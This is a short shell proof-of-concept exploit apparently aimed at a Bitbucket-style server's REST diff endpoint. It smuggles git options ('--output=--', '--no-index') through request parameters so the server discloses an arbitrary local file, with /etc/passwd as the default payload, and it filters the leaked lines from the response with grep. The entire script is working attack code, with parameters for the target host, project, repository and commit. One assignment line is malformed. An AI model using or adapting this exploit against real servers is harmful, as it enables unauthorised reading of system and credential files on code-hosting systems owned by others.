#!/bin/sh

remote=$1 #"http://cqq.com:7990" 
projects=$2 #"TES"
repos=$3 #"poc"
hash=$4 "dc7271c5b5e3adcf469fb1223ef8a338d9c1465d"    #whatever commit hash value of a valid file on this repo
payload="/etc/passwd"                              #the file you want to read
flag="this operation must be run in a work tree"   #flag response string

url_step1="/rest/api/latest/projects/$projects/repos/$repos/commits/$hash/diff/xxx?since=--output=--"
url_step2="/rest/api/latest/projects/$projects/repos/$repos/commits/--/diff/$payload?since=--no-index"

curl $remote$url_step1
curl $remote$url_step2|grep \"line\"
